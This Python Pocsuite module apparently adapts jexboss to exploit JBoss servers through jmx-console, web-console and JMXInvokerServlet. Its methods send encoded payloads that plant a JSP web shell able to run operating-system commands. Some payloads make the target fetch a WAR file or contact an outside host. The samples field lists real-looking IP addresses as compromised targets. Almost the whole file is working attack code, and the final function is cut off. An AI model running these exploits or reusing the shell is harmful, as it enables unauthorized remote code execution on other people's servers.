#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

"""
JBoss 三种POC漏洞检测 author:https://github.com/joaomatosf/jexboss
"""
from sys import exit, version_info
from time import sleep
from random import randint

try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

try:
    from urllib3 import disable_warnings, PoolManager
    from urllib3.util.timeout import Timeout
except ImportError:
    ver = version_info[0] if version_info[0] >= 3 else ""
    raise ("\n * Package urllib3 not installed. Please install the package urllib3 before continue.\n"
           + "   Example: \n"
           + "   # apt-get install python%s-pip ; easy_install%s urllib3\n" % (ver, ver))

from urllib3 import disable_warnings, PoolManager
from urllib3.util.timeout import Timeout
#忽略 提示的警告信息
disable_warnings()
#线程安全池
timeout = Timeout(connect=3.0, read=6.0)
pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
               "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
               "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
               "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
               "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
               "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
               "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]


class JbossPOC(POCBase):
    vulID = '13'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-06-29' #漏洞公开的时间,不知道就写今天

    author = 'i@cdxy.me' #  PoC作者的大名
    createDate = '2017-06-29'# 编写 PoC 的日期
    updateDate = '2017-06-29'# PoC 更新的时间,默认和编写时间一样
    references = 'https://github.com/Xyntax/POC-T'# 漏洞地址来源,0day不用写
    name = 'JBoss serialization getshell'# PoC 名称
    appPowerLink = 'http://www.jboss.org/'# 漏洞厂商主页地址
    appName = 'JBoss'# 漏洞应用名称
    appVersion = 'www.seebug.org/vuldb/ssvid-89723'# 漏洞影响版本
    vulType = 'code-exec'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Jboss 反序列化漏洞
    ''' # 漏洞简要描述
    samples = ["1.197.56.123:8087","50.200.187.230:8087",]# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    def get_successfully(self,url, path):
        """
        Test if a GET to a URL is successful
        :param url: The base URL
        :param path: The URL path
        :return: The HTTP status code
        """
        sleep(5)
        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Connection": "keep-alive",
                   "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
        r = pool.request('GET', url + path, redirect=False, headers=headers, timeout=3)
        result = r.status
        if result == 404:
            sleep(7)
            r = pool.request('GET', url + path, redirect=False, headers=headers, timeout=3)
            result = r.status
        return result


    def exploit_jmx_console_main_deploy(self,url):
        """
        Exploit MainDeployer to deploy a JSP shell. Does not work in JBoss 5 (bug in JBoss 5).
        /jmx-console/HtmlAdaptor
        :param url: The url to exploit
        :return: The HTTP status code
        """
        if not 'http' in url[:4]:
            url = "http://" + url

        jsp = "http://www.joaomatosf.com/rnp/jexws.war"
        payload = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service="
                   "MainDeployer&methodIndex=19&arg0=" + jsp)

        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Connection": "keep-alive",
                   "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
        pool.request('HEAD', url + payload, redirect=False, headers=headers, timeout=3)
        return self.get_successfully(url, "/jexws/jexws.jsp")


    def exploit_jmx_console_file_repository(self,url):
        """
        Exploit DeploymentFileRepository to deploy a JSP shell
        Tested and working in JBoss 4, 5. Does not work in JBoss 6.
        /jmx-console/HtmlAdaptor
        :param url: The URL to exploit
        :return: The HTTP status code
        """
        jsp = ("%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%75"
               "%74%69%6c%2e%2a%2c%6a%61%76%61%2e%69%6f%2e%2a%2c%20%6a%61%76%61%2e%6e"
               "%65%74%2e%2a%22%20%70%61%67%65%45%6e%63%6f%64%69%6e%67%3d%22%55%54%46"
               "%2d%38%22%25%3e%3c%70%72%65%3e%3c%25%69%66%20%28%72%65%71%75%65%73%74"
               "%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%70%70%70%22%29%20%21%3d"
               "%20%6e%75%6c%6c%29%20%7b%20%53%74%72%69%6e%67%20%77%72%69%74%65%70%65"
               "%72%6d%69%73%73%69%6f%6e%20%3d%20%28%6e%65%77%20%44%61%74%65%28%29%2e"
               "%74%6f%53%74%72%69%6e%67%28%29%2e%73%70%6c%69%74%28%22%3a%22%29%5b%30"
               "%5d%2b%22%68%2e%6c%6f%67%22%29%2e%72%65%70%6c%61%63%65%41%6c%6c%28%22"
               "%20%22%2c%20%22%2d%22%29%3b%20%53%74%72%69%6e%67%20%73%68%5b%5d%20%3d"
               "%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22"
               "%70%70%70%22%29%2e%73%70%6c%69%74%28%22%20%22%29%3b%20%63%68%65%63%6b"
               "%2e%73%65%74%52%65%71%75%65%73%74%50%72%6f%70%65%72%74%79%28%22%55%73"
               "%65%72%2d%41%67%65%6e%74%22%2c%20%72%65%71%75%65%73%74%2e%67%65%74%48"
               "%65%61%64%65%72%28%22%48%6f%73%74%22%29%2b%22%3c%2d%22%2b%72%65%71%75"
               "%65%73%74%2e%67%65%74%52%65%6d%6f%74%65%41%64%64%72%28%29%29%3b%20%69"
               "%66%20%28%21%6e%65%77%20%46%69%6c%65%28%22%63%68%65%63%6b%5f%22%2b%77"
               "%72%69%74%65%70%65%72%6d%69%73%73%69%6f%6e%29%2e%65%78%69%73%74%73%28"
               "%29%29%7b%20%50%72%69%6e%74%57%72%69%74%65%72%20%77%72%69%74%65%72%20"
               "%3d%20%6e%65%77%20%50%72%69%6e%74%57%72%69%74%65%72%28%22%63%68%65%63"
               "%6b%5f%22%2b%77%72%69%74%65%70%65%72%6d%69%73%73%69%6f%6e%29%3b%20%63"
               "%68%65%63%6b%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%20"
               "%77%72%69%74%65%72%2e%63%6c%6f%73%65%28%29%3b%20%7d%20%65%6c%73%65%20"
               "%69%66%20%28%73%68%5b%30%5d%2e%63%6f%6e%74%61%69%6e%73%28%22%69%64%22"
               "%29%20%7c%7c%20%73%68%5b%30%5d%2e%63%6f%6e%74%61%69%6e%73%28%22%69%70"
               "%63%6f%6e%66%69%67%22%29%29%20%63%68%65%63%6b%2e%67%65%74%49%6e%70%75"
               "%74%53%74%72%65%61%6d%28%29%3b%20%74%72%79%20%7b%20%50%72%6f%63%65%73"
               "%73%20%70%3b%20%69%66%20%28%53%79%73%74%65%6d%2e%67%65%74%50%72%6f%70"
               "%65%72%74%79%28%22%6f%73%2e%6e%61%6d%65%22%29%2e%74%6f%4c%6f%77%65%72"
               "%43%61%73%65%28%29%2e%69%6e%64%65%78%4f%66%28%22%77%69%6e%22%29%20%3e"
               "%20%30%29%7b%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e"
               "%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%6d%64%2e%65%78%65%20%2f%63"
               "%20%22%2b%73%68%29%3b%20%7d%20%65%6c%73%65%20%7b%70%20%3d%20%52%75%6e"
               "%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28"
               "%73%68%29%3b%7d%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%64%20"
               "%3d%20%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65"
               "%77%20%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%70%2e%67"
               "%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%20%53%74%72%69"
               "%6e%67%20%64%69%73%72%20%3d%20%64%2e%72%65%61%64%4c%69%6e%65%28%29%3b"
               "%20%77%68%69%6c%65%20%28%64%69%73%72%20%21%3d%20%6e%75%6c%6c%29%20%7b"
               "%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%64%69%73%72%29%3b%20%64%69%73"
               "%72%20%3d%20%64%2e%72%65%61%64%4c%69%6e%65%28%29%3b%20%7d%20%7d%63%61"
               "%74%63%68%28%45%78%63%65%70%74%69%6f%6e%20%65%29%20%7b%6f%75%74%2e%70"
               "%72%69%6e%74%6c%6e%28%22%55%6e%6b%6e%6f%77%6e%20%63%6f%6d%6d%61%6e%64"
               "%2e%22%29%3b%7d%7d%25%3e")

        payload = ("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="
                   "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="
                   "jexws.war&argType=java.lang.String&arg1=jexws&argType=java.lang.St"
                   "ring&arg2=.jsp&argType=java.lang.String&arg3=" + jsp + "&argType=boolean&arg4=True")

        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Connection": "keep-alive",
                   "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
        pool.request('HEAD', url + payload, redirect=False, headers=headers, timeout=3)
        return self.get_successfully(url, "/jexws/jexws.jsp")


    def exploit_jmx_invoker_file_repository(self,url, version):
        """
        Exploits the JMX invoker
        tested and works in JBoss 4, 5
        MainDeploy, shell in data
        # /invoker/JMXInvokerServlet
        :param url: The URL to exploit
        :return:
        """
        payload = ("\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e"
                   "\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c"
                   "\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xf6\x06\x95\x27\x41\x3e\xa4"
                   "\xbe\x0c\x00\x00\x78\x70\x70\x77\x08\x78\x94\x98\x47\xc1\xd0\x53\x87\x73\x72"
                   "\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72"
                   "\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65"
                   "\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65"
                   "\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70")
        payload += ("\xe3\x2c\x60\xe6") if version == 0 else ("\x26\x95\xbe\x0a")
        payload += (
            "\x73\x72\x00\x24\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61"
            "\x74\x69\x6f\x6e\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c\x65\x64\x56\x61\x6c\x75"
            "\x65\xea\xcc\xe0\xd1\xf4\x4a\xd0\x99\x0c\x00\x00\x78\x70\x7a\x00\x00\x04\x00"
            "\x00\x00\x05\xaa\xac\xed\x00\x05\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e"
            "\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29"
            "\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x04\x73\x72\x00\x1b\x6a\x61\x76\x61\x78"
            "\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e"
            "\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x2c"
            "\x6a\x62\x6f\x73\x73\x2e\x61\x64\x6d\x69\x6e\x3a\x73\x65\x72\x76\x69\x63\x65"
            "\x3d\x44\x65\x70\x6c\x6f\x79\x6d\x65\x6e\x74\x46\x69\x6c\x65\x52\x65\x70\x6f"
            "\x73\x69\x74\x6f\x72\x79\x78\x74\x00\x05\x73\x74\x6f\x72\x65\x75\x71\x00\x7e"
            "\x00\x00\x00\x00\x00\x05\x74\x00\x0a\x6a\x65\x78\x69\x6e\x76\x2e\x77\x61\x72"
            "\x74\x00\x06\x6a\x65\x78\x69\x6e\x76\x74\x00\x04\x2e\x6a\x73\x70\x74\x04\x71"
            "\x3c\x25\x40\x20\x70\x61\x67\x65\x20\x69\x6d\x70\x6f\x72\x74\x3d\x22\x6a\x61"
            "\x76\x61\x2e\x75\x74\x69\x6c\x2e\x2a\x2c\x6a\x61\x76\x61\x2e\x69\x6f\x2e\x2a"
            "\x2c\x20\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x2a\x22\x20\x70\x61\x67\x65\x45"
            "\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22\x55\x54\x46\x2d\x38\x22\x25\x3e\x3c\x70"
            "\x72\x65\x3e\x3c\x25\x69\x66\x28\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74"
            "\x50\x61\x72\x61\x6d\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x20\x21\x3d"
            "\x20\x6e\x75\x6c\x6c\x29\x7b\x20\x55\x52\x4c\x20\x75\x72\x6c\x20\x3d\x20\x6e"
            "\x65\x77\x20\x55\x52\x4c\x28\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x65\x62\x73"
            "\x68\x65\x6c\x6c\x2e\x6a\x65\x78\x62\x6f\x73\x73\x2e\x6e\x65\x74\x2f\x22\x29"
            "\x3b\x20\x48\x74\x74\x70\x55\x52\x4c\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e"
            "\x20\x63\x68\x65\x63\x6b\x20\x3d\x20\x28\x48\x74\x74\x70\x55\x52\x4c\x43\x6f"
            "\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x29\x20\x75\x72\x6c\x2e\x6f\x70\x65\x6e\x43"
            "\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x28\x29\x3b\x20\x53\x74\x72\x69\x6e\x67"
            "\x20\x77\x72\x69\x74\x65\x70\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x20\x3d\x20"
            "\x28\x6e\x65\x77\x20\x44\x61\x74\x65\x28\x29\x2e\x74\x6f\x53\x74\x72\x69\x6e"
            "\x67\x28\x29\x2e\x73\x70\x6c\x69\x74\x28\x22\x3a\x22\x29\x5b\x30\x5d\x2b\x22"
            "\x68\x2e\x6c\x6f\x67\x22\x29\x2e\x72\x65\x70\x6c\x61\x63\x65\x41\x6c\x6c\x28"
            "\x22\x20\x22\x2c\x20\x22\x2d\x22\x29\x3b\x20\x53\x74\x72\x69\x6e\x67\x20\x73"
            "\x68\x5b\x5d\x20\x3d\x20\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x50\x61"
            "\x72\x61\x6d\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x2e\x73\x70\x6c\x69"
            "\x74\x28\x22\x20\x22\x29\x3b\x20\x63\x68\x65\x63\x6b\x2e\x73\x65\x74\x52\x65"
            "\x71\x75\x65\x73\x74\x50\x72\x6f\x70\x65\x72\x74\x79\x28\x22\x55\x73\x65\x72"
            "\x2d\x41\x67\x65\x6e\x74\x22\x2c\x20\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65"
            "\x74\x48\x65\x61\x64\x65\x72\x28\x22\x48\x6f\x73\x74\x22\x29\x2b\x22\x3c\x2d"
            "\x22\x2b\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74\x52\x65\x6d\x6f\x74\x65"
            "\x41\x64\x64\x72\x28\x29\x29\x3b\x20\x69\x66\x20\x28\x21\x6e\x65\x77\x20\x46"
            "\x69\x6c\x65\x28\x22\x63\x68\x65\x63\x6b\x5f\x22\x2b\x77\x72\x69\x74\x65\x70"
            "\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x29\x2e\x65\x78\x69\x73\x74\x73\x28\x29"
            "\x29\x7b\x20\x50\x72\x69\x6e\x74\x57\x72\x69\x74\x65\x72\x20\x77\x72\x69\x74"
            "\x65\x72\x20\x3d\x20\x6e\x65\x77\x20\x50\x72\x69\x6e\x74\x57\x72\x69\x74\x65"
            "\x72\x28\x22\x63\x68\x65\x63\x6b\x5f\x22\x2b\x77\x72\x69\x74\x65\x70\x65\x72"
            "\x6d\x69\x73\x73\x69\x6f\x6e\x29\x3b\x20\x63\x68\x65\x63\x6b\x2e\x67\x65\x74"
            "\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x29\x3b\x20\x77\x72\x69\x74"
            "\x65\x72\x2e\x63\x6c\x6f\x73\x65\x28\x29\x3b\x20\x7d\x20\x65\x6c\x73\x65\x20"
            "\x69\x66\x20\x28\x73\x68\x5b\x30\x5d\x2e\x63\x6f\x6e\x74\x61\x69\x6e\x73\x28"
            "\x22\x69\x64\x22\x29\x20\x7c\x7c\x20\x73\x68\x5b\x30\x5d\x2e\x63\x6f\x6e\x74"
            "\x61\x69\x6e\x73\x28\x22\x69\x70\x63\x6f\x6e\x66\x69\x67\x22\x29\x29\x20\x63"
            "\x68\x65\x63\x6b\x2e\x67\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d"
            "\x28\x29\x3b\x20\x74\x72\x79\x20\x7b\x20\x50\x72\x6f\x63\x65\x73\x73\x20\x70"
            "\x3b\x20\x69\x66\x20\x28\x53\x79\x73\x74\x65\x6d\x2e\x67\x65\x74\x50\x72\x6f"
            "\x70\x65\x72\x74\x79\x28\x22\x6f\x73\x2e\x6e\x61\x6d\x65\x22\x29\x2e\x74\x6f"
            "\x4c\x6f\x77\x65\x72\x43\x61\x73\x65\x28\x29\x2e\x69\x6e\x64\x65\x78\x4f\x66"
            "\x28\x22\x77\x69\x6e\x22\x29\x20\x3e\x20\x30\x29\x7b\x20\x70\x20\x3d\x20\x52"
            "\x75\x6e\x74\x69\x6d\x65\x2e\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x7a\x00"
            "\x00\x01\xb2\x28\x29\x2e\x65\x78\x65\x63\x28\x22\x63\x6d\x64\x2e\x65\x78\x65"
            "\x20\x2f\x63\x20\x22\x2b\x73\x68\x29\x3b\x20\x7d\x20\x65\x6c\x73\x65\x20\x7b"
            "\x70\x20\x3d\x20\x52\x75\x6e\x74\x69\x6d\x65\x2e\x67\x65\x74\x52\x75\x6e\x74"
            "\x69\x6d\x65\x28\x29\x2e\x65\x78\x65\x63\x28\x73\x68\x29\x3b\x7d\x20\x42\x75"
            "\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x20\x64\x20\x3d\x20\x6e\x65"
            "\x77\x20\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x28\x6e\x65"
            "\x77\x20\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x52\x65\x61\x64\x65\x72"
            "\x28\x70\x2e\x67\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x28\x29"
            "\x29\x29\x3b\x20\x53\x74\x72\x69\x6e\x67\x20\x64\x69\x73\x72\x20\x3d\x20\x64"
            "\x2e\x72\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20\x77\x68\x69\x6c\x65\x20"
            "\x28\x64\x69\x73\x72\x20\x21\x3d\x20\x6e\x75\x6c\x6c\x29\x20\x7b\x20\x6f\x75"
            "\x74\x2e\x70\x72\x69\x6e\x74\x6c\x6e\x28\x64\x69\x73\x72\x29\x3b\x20\x64\x69"
            "\x73\x72\x20\x3d\x20\x64\x2e\x72\x65\x61\x64\x4c\x69\x6e\x65\x28\x29\x3b\x20"
            "\x7d\x20\x7d\x63\x61\x74\x63\x68\x28\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x20"
            "\x65\x29\x20\x7b\x6f\x75\x74\x2e\x70\x72\x69\x6e\x74\x6c\x6e\x28\x22\x55\x6e"
            "\x6b\x6e\x6f\x77\x6e\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x2e\x22\x29\x3b\x7d\x7d"
            "\x25\x3e\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x42\x6f\x6f"
            "\x6c\x65\x61\x6e\xcd\x20\x72\x80\xd5\x9c\xfa\xee\x02\x00\x01\x5a\x00\x05\x76"
            "\x61\x6c\x75\x65\x78\x70\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c"
            "\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47"
            "\x02\x00\x00\x78\x70\x00\x00\x00\x05\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61"
            "\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x71\x00\x7e\x00\x0f\x71\x00\x7e\x00\x0f"
            "\x71\x00\x7e\x00\x0f\x74\x00\x07\x62\x6f\x6f\x6c\x65\x61\x6e\x69\x0e\x8b\x92"
            "\x78\x77\x08\x00\x00\x00\x00\x00\x00\x00\x01\x73\x72\x00\x22\x6f\x72\x67\x2e"
            "\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x49\x6e"
            "\x76\x6f\x63\x61\x74\x69\x6f\x6e\x4b\x65\x79\xb8\xfb\x72\x84\xd7\x93\x85\xf9"
            "\x02\x00\x01\x49\x00\x07\x6f\x72\x64\x69\x6e\x61\x6c\x78\x70\x00\x00\x00\x04"
            "\x70\x78")

        headers = {"Content-Type": "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
                   "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
                   "Connection": "keep-alive",
                   "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

        r = pool.urlopen('POST', url + "/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
        result = r.status

        if result == 401:
            pass
        pool.urlopen('HEAD', url + "/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
        return self.get_successfully(url, "/jexinv/jexinv.jsp")


    def exploit_web_console_invoker(self,url):
        """
        Exploits web console invoker
        Does not work in JBoss 5 (bug in JBoss5)
        :param url: The URL to exploit
        :return: The HTTP status code
        """
        payload = (
            "\xac\xed\x00\x05\x73\x72\x00\x2e\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e"
            "\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x72\x65\x6d\x6f\x74\x65\x2e\x52\x65\x6d\x6f"
            "\x74\x65\x4d\x42\x65\x61\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xe0\x4f"
            "\xa3\x7a\x74\xae\x8d\xfa\x02\x00\x04\x4c\x00\x0a\x61\x63\x74\x69\x6f\x6e\x4e"
            "\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74"
            "\x72\x69\x6e\x67\x3b\x5b\x00\x06\x70\x61\x72\x61\x6d\x73\x74\x00\x13\x5b\x4c"
            "\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x5b\x00"
            "\x09\x73\x69\x67\x6e\x61\x74\x75\x72\x65\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61"
            "\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x10\x74\x61\x72"
            "\x67\x65\x74\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x74\x00\x1d\x4c\x6a\x61"
            "\x76\x61\x78\x2f\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2f\x4f\x62\x6a\x65"
            "\x63\x74\x4e\x61\x6d\x65\x3b\x78\x70\x74\x00\x06\x64\x65\x70\x6c\x6f\x79\x75"
            "\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65"
            "\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00"
            "\x01\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x96\x25"
            "\x37\x36\x1a\xfc\xe4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6f\x64"
            "\x65\x49\x00\x04\x70\x6f\x72\x74\x4c\x00\x09\x61\x75\x74\x68\x6f\x72\x69\x74"
            "\x79\x71\x00\x7e\x00\x01\x4c\x00\x04\x66\x69\x6c\x65\x71\x00\x7e\x00\x01\x4c"
            "\x00\x04\x68\x6f\x73\x74\x71\x00\x7e\x00\x01\x4c\x00\x08\x70\x72\x6f\x74\x6f"
            "\x63\x6f\x6c\x71\x00\x7e\x00\x01\x4c\x00\x03\x72\x65\x66\x71\x00\x7e\x00\x01"
            "\x78\x70\xff\xff\xff\xff\xff\xff\xff\xff\x74\x00\x0e\x6a\x6f\x61\x6f\x6d\x61"
            "\x74\x6f\x73\x66\x2e\x63\x6f\x6d\x74\x00\x0e\x2f\x72\x6e\x70\x2f\x6a\x65\x78"
            "\x77\x73\x2e\x77\x61\x72\x71\x00\x7e\x00\x0b\x74\x00\x04\x68\x74\x74\x70\x70"
            "\x78\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74"
            "\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00"
            "\x00\x00\x01\x74\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x73"
            "\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74"
            "\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf"
            "\x03\x00\x00\x78\x70\x74\x00\x21\x6a\x62\x6f\x73\x73\x2e\x73\x79\x73\x74\x65"
            "\x6d\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65\x70\x6c\x6f"
            "\x79\x65\x72\x78")

        headers = {
            "Content-Type": "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
            "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
            "Connection": "keep-alive",
            "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
        r = pool.urlopen('POST', url + "/web-console/Invoker", redirect=False, headers=headers, body=payload)
        result = r.status
        if result == 401:
            pass
        pool.urlopen('HEAD', url + "/web-console/Invoker", redirect=False, headers=headers, body=payload)
        return self.get_successfully(url, "/jexws/jexws.jsp")


    def auto_exploit(self,url, exploit_type):
        result = 505
        if exploit_type == "jmx-console":
            result = self.exploit_jmx_console_file_repository(url)
            if result != 200 and result != 500:
                result = self.exploit_jmx_console_main_deploy(url)
        elif exploit_type == "web-console":
            result = self.exploit_web_console_invoker(url)
        elif exploit_type == "JMXInvokerServlet":
            result = self.exploit_jmx_invoker_file_repository(url, 0)
            if result != 200 and result != 500:
                result = self.exploit_jmx_invoker_file_repository(url, 1)

        if result == 200 or result == 500:
            return True


    def poc(self,url):
        """
        Test if a GET to a URL is successful
        :param url: The URL to test
        :return: A dict with the exploit type as the keys, and the HTTP status code as the value
        """

        headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Connection": "keep-alive",
                   "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

